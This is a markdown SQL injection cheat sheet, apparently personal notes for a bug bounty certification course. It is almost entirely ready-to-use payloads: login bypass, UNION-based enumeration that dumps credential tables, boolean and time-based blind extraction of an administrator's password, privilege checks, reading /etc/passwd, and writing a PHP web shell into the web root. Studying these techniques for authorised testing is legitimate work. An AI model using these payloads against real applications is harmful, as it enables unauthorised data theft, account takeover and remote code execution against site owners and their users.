# CBBH PATH

# SQL Injection Cheat Sheet
```powershell
# Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
```

## Find the Vuln Query
```powershell
# Check the url after the ?Abdullah=Abdullah
# Check login fields
```

## Fix the Query (Comment)
```powershell
--
#
```

## Payloads
```powershell
' or 1=1 --
'--
```
## String Concatenation
```powershell
' UNION select NULL, username || '*' || password from users--
```

## Detmine the number of columns
```powershell
# Using UNION. The number and the order of the columns must be the same in all queries && The data types must be compatible
cn' UNION select NULL, NULL, NULL-- -
cn' UNION select NULL, NULL, NULL, NULL-- -
UNION select NULL, NULL, NULL, NULL from Abdullah-- -

# Using OrderBy
' order by 1-- -
```

## Finding a column containing text (Data Type)
```powershell
# In case of an error it means the column is not type string
# In case of no error it menas the column is type string
cn' UNION select NULL, 'Abdullah', NULL, NULL-- -
UNION select username, NULL, NULL, 'Abdullah' from Abdullah-- -
```

## DB Enumeration
```powershell
SELECT @@version #Fingerprint MySQL with query output
SELECT SLEEP(5) #Fingerprint MySQL with no output
cn' UNION select 1,database(),2,3-- - #Current database name
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - #List all databases
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - #List all tables in a specific database
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - #List all columns in a specific table
cn' UNION select 1, username, password, 4 from dev.credentials-- - #Dump data from a table in another database
```

# Blind SQLI
## Blind SQLI -  Find the vulnerable parameter (Conditional Responses)
```powershell
keep in mind that you need to find some strings to be returned from the web app like a welcome back message, if the query is true it will return welcome back otherwise it won't. If you can convert the true query to a false one this indicates a blind SQLI vulnerability exists. Example:
' and 1=1--  -> if this return true
' and 1=0--  -> if this return false
(Blind SQLI is present)
```

## Confirm that we have a users table (Conditional Responses)
```powershell
' and (select 'x' from users LIMIT 1)='X'--
```

## Confirm that username administrator exists in the users table (Conditional Responses)
```powershell
' and (select username from users where username ='administrator' LIMIT 1)='administrator'--
```

## Enumerate the password of the administrator user (Conditional Responses)
```powershel
1) determine the password length
# is the password > 1. If it returns true check if the password > 2 and so on... you can use intruder(sniper)
' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--

2) check if the first character is = 'A'. if yes u will get the welcome back message otherwise you will go to the next character 'B'... you can use intruder(cluster bomb)
' and (select substring(password,1,1) from users where username='administrator')='a'--
```

## Time Delays
```powershell
' || (SELECT pg_sleep(10))--
```

## Confirm that the users table exists (Time Delays)
```powershell
' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users)--
```

## Confirm the password length
```powershell
1) determine the password length
' || (SELECT CASE WHEN (username='administrator' and LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users)--

2) check if the first character is = 'A'. if yes u will get the welcome back message otherwise you will go to the next character 'B'... you can use intruder(cluster bomb)
' || (SELECT CASE WHEN (username='administrator' and substring(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users)--
```

## Privileges
```powershell
cn' UNION SELECT 1, user(), 3, 4-- -   #Find current user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -   #Find if user has admin privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -   #Find if all user privileges
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -  #Find which directories can be accessed through MySQL
```

## File Injection
```powershell
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -   #Read loal file
select 'file written successfully!' into outfile '/var/www/html/proof.txt'   #write a string to a local file
cn' union select "",'<?php system($_REQUEST[Abdullah]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -   # Write a web shell into the base web directory
```
